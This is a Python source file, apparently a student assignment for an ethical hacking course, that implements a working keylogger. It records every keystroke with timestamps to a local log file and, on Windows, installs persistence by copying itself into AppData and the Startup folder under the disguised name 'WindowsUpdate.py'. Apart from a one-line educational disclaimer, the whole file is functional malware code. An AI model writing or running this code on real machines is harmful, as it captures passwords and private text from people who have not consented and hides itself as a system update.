"""
Keylogger - Trabajo Parcial
Curso: 1CCB0001 - Hacking Etico
Semestre: 2026-10
Docente: Gianpaul Custodio

ADVERTENCIA: Este software es unicamente con fines educativos.
Su uso sin consentimiento es ilegal.
"""

import os
import sys
import shutil
import datetime
from pynput import keyboard

# ============================================================
# CONFIGURACION
# ============================================================
LOG_FILE = "log.txt"
PERSISTENCIA = True  # Funcionalidad adicional: persistencia

# ============================================================
# FUNCION PARA ESCRIBIR EN EL LOG
# ============================================================
def escribir_log(texto):
    """Escribe la tecla capturada en el archivo de log con timestamp."""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {texto}\n")

# ============================================================
# FUNCION DE PERSISTENCIA (Funcionalidad adicional)
# ============================================================
def instalar_persistencia():
    """
    Copia el script a una ubicacion del sistema y lo agrega
    al inicio automatico de Windows (si es Windows).
    """
    try:
        if sys.platform.startswith("win"):
            # Copiar a carpeta AppData
            ruta_destino = os.path.join(
                os.getenv("APPDATA"), "WindowsUpdate.py"
            )
            shutil.copyfile(sys.argv[0], ruta_destino)

            # Agregar al inicio automatico (carpeta Startup)
            carpeta_inicio = os.path.join(
                os.getenv("APPDATA"),
                "Microsoft", "Windows", "Start Menu",
                "Programs", "Startup"
            )
            acceso_directo = os.path.join(carpeta_inicio, "WindowsUpdate.py")
            shutil.copyfile(sys.argv[0], acceso_directo)

            print("[+] Persistencia instalada correctamente.")
    except Exception as e:
        print(f"[-] Error al instalar persistencia: {e}")

# ============================================================
# MANEJADOR DE EVENTOS DEL TECLADO
# ============================================================
def al_presionar(tecla):
    """Captura cada tecla presionada y la guarda en el log."""
    try:
        # Si es un caracter normal
        escribir_log(tecla.char)
    except AttributeError:
        # Si es una tecla especial (Shift, Ctrl, etc.)
        escribir_log(f"[{tecla.name.upper()}]")

def al_soltar(tecla):
    """Detiene el keylogger si se presiona ESC."""
    if tecla == keyboard.Key.esc:
        print("[!] Keylogger detenido.")
        return False

# ============================================================
# FUNCION PRINCIPAL
# ============================================================
def main():
    print("=" * 50)
    print(" KEYLOGGER - Trabajo Parcial Hacking Etico")
    print("=" * 50)
    print("[*] Iniciando captura de teclas...")
    print("[*] Presiona ESC para detener.")
    print(f"[*] Los logs se guardan en: {os.path.abspath(LOG_FILE)}")

    # Instalar persistencia (funcionalidad adicional)
    if PERSISTENCIA:
        instalar_persistencia()

    # Iniciar el listener del teclado
    with keyboard.Listener(
        on_press=al_presionar,
        on_release=al_soltar
    ) as listener:
        listener.join()

# ============================================================
# PUNTO DE ENTRADA
# ============================================================
if __name__ == "__main__":
    main()